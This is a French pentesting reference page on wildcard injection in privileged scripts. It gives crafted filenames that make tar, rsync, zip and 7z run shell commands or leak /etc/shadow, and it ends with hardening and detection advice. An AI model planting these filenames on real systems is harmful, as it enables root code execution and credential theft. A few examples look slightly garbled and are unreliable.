# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> L'injection d'**argument par wildcard** (aussi appelée *glob*) se produit lorsqu'un script privilégié exécute un binaire Unix tel que `tar`, `chown`, `rsync`, `zip`, `7z`, … avec un wildcard non cité comme `*`. 
> Étant donné que le shell développe le wildcard **avant** d'exécuter le binaire, un attaquant capable de créer des fichiers dans le répertoire de travail peut concevoir des noms de fichiers qui commencent par `-` afin qu'ils soient interprétés comme **options au lieu de données**, permettant ainsi de faire passer des drapeaux arbitraires ou même des commandes.
> Cette page regroupe les primitives les plus utiles, les recherches récentes et les détections modernes pour 2023-2025.

## chown / chmod

Vous pouvez **copier le propriétaire/groupe ou les bits de permission d'un fichier arbitraire** en abusant du drapeau `--reference` :
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Lorsque root exécute ensuite quelque chose comme :
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` est injecté, ce qui fait que *tous* les fichiers correspondants héritent de la propriété/des permissions de `/root/secret``file`.

*PoC & outil* : [`wildpwn`](https://github.com/localh0t/wildpwn) (attaque combinée).  
Voir aussi le document classique de DefenseCode pour plus de détails.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Exécutez des commandes arbitraires en abusant de la fonctionnalité **checkpoint** :
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Une fois que root exécute par exemple `tar -czf /root/backup.tgz *`, `shell.sh` est exécuté en tant que root.

### bsdtar / macOS 14+

Le `tar` par défaut sur les versions récentes de macOS (basé sur `libarchive`) *n'implémente pas* `--checkpoint`, mais vous pouvez toujours obtenir une exécution de code avec le drapeau **--use-compress-program** qui vous permet de spécifier un compresseur externe.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Lorsque un script privilégié exécute `tar -cf backup.tar *`, `/bin/sh` sera lancé.

---

## rsync

`rsync` vous permet de remplacer le shell distant ou même le binaire distant via des options de ligne de commande qui commencent par `-e` ou `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root archive ensuite le répertoire avec `rsync -az * backup:/srv/`, le drapeau injecté lance votre shell du côté distant.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Même lorsque le script privilégié *défensivement* préfixe le caractère générique avec `--` (pour arrêter l'analyse des options), le format 7-Zip prend en charge les **fichiers de liste de fichiers** en préfixant le nom de fichier avec `@`. Combiner cela avec un lien symbolique vous permet d'*exfiltrer des fichiers arbitraires* :
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root exécute quelque chose comme :
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentera de lire `root.txt` (→ `/etc/shadow`) comme une liste de fichiers et échouera, **imprimant le contenu sur stderr**.

---

## zip

`zip` prend en charge le drapeau `--unzip-command` qui est passé *tel quel* au shell système lorsque l'archive sera testée :
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injectez le drapeau via un nom de fichier conçu et attendez que le script de sauvegarde privilégié appelle `zip -T` (test d'archive) sur le fichier résultant.

---

## Binaries supplémentaires vulnérables à l'injection de caractères génériques (liste rapide 2023-2025)

Les commandes suivantes ont été abusées dans des CTF modernes et des environnements réels. La charge utile est toujours créée en tant que *nom de fichier* à l'intérieur d'un répertoire écrivable qui sera ensuite traité avec un caractère générique :

| Binaire | Drapeau à abuser | Effet |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → `@file` arbitraire | Lire le contenu du fichier |
| `flock` | `-c <cmd>` | Exécuter la commande |
| `git`   | `-c core.sshCommand=<cmd>` | Exécution de commande via git sur SSH |
| `scp`   | `-S <cmd>` | Lancer un programme arbitraire au lieu de ssh |

Ces primitives sont moins courantes que les classiques *tar/rsync/zip* mais valent la peine d'être vérifiées lors de la chasse.

---

## Détection & Renforcement

1. **Désactiver le globbing shell** dans les scripts critiques : `set -f` (`set -o noglob`) empêche l'expansion des caractères génériques.
2. **Citer ou échapper** les arguments : `tar -czf "$dst" -- *` n'est *pas* sûr — préférez `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Chemins explicites** : Utilisez `/var/www/html/*.log` au lieu de `*` afin que les attaquants ne puissent pas créer de fichiers frères commençant par `-`.
4. **Moins de privilèges** : Exécutez les tâches de sauvegarde/maintenance en tant que compte de service non privilégié au lieu de root chaque fois que cela est possible.
5. **Surveillance** : La règle préconçue d'Elastic *Potential Shell via Wildcard Injection* recherche `tar --checkpoint=*`, `rsync -e*`, ou `zip --unzip-command` immédiatement suivi d'un processus enfant shell. La requête EQL peut être adaptée pour d'autres EDR.

---

## Références

* Elastic Security – Règle détectée *Potential Shell via Wildcard Injection* (dernière mise à jour 2025)
* Rutger Flohil – “macOS — Injection de caractères génériques Tar” (18 déc 2024)

{{#include ../../banners/hacktricks-training.md}}
